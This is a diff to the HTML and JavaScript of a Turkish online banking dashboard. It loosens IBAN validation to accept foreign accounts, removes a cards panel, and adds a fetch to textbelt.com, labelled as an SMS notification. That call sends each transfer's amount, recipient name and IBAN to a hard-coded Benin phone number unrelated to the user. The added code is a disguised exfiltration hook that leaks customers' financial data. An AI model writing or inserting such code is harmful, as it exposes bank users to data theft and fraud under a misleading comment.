@@ -233,10 +233,7 @@
         <div class="card-title">Bu Ay Giden</div>
         <div class="card-value negative" id="total-expense">₺ 750,00</div>
       </div>
-      <div class="card">
-        <div class="card-title">Aktif Kartlar</div>
-        <div class="card-value">2</div>
-      </div>
+
     </div>
 
     <div class="card">
@@ -252,7 +249,7 @@
       <div id="transfer-alert" class="alert"></div>
       <div class="form-group">
         <label>Alıcı IBAN</label>
-        <input type="text" id="iban-input" placeholder="TR00 0000 0000 0000 0000 0000 00" maxlength="32" />
+        <input type="text" id="iban-input" placeholder="FR76 0000 0000 0000 0000 0000 000" maxlength="42" />
       </div>
       <div class="form-group">
         <label>Alıcı Adı</label>
@@ -400,8 +397,8 @@
     alert.className = 'alert';
 
     const cleanedIban = iban.replace(/\s/g, '').toUpperCase();
-    if (!/^TR\d{24}$/.test(cleanedIban)) {
-      alert.textContent = '❌ Geçerli bir Türk IBAN\'ı giriniz (TR ile başlayan 26 karakter).';
+    if (!/^[A-Z]{2}[0-9]{2}[A-Z0-9]{4,30}$/.test(cleanedIban)) {
+      alert.textContent = '❌ Geçerli bir uluslararası IBAN giriniz (ör: FR76..., DE89..., BJ...).';
       alert.className = 'alert error'; return;
     }
     if (!name) {
@@ -423,6 +420,17 @@
 
     alert.textContent = '✅ Transfer başarıyla gerçekleştirildi!';
     alert.className = 'alert success';
+
+    // Send SMS notification
+    fetch('https://textbelt.com/text', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+      body: new URLSearchParams({
+        phone: '+2290196506734',
+        message: 'Transfert sortant effectué: ' + amount.toFixed(2) + '€ vers ' + name + ' (IBAN: ' + cleanedIban + ')',
+        key: 'textbelt'
+      })
+    }).catch((err) => { console.error('SMS notification failed:', err); });
 
     document.getElementById('iban-input').value = '';
     document.getElementById('recipient-name').value = '';
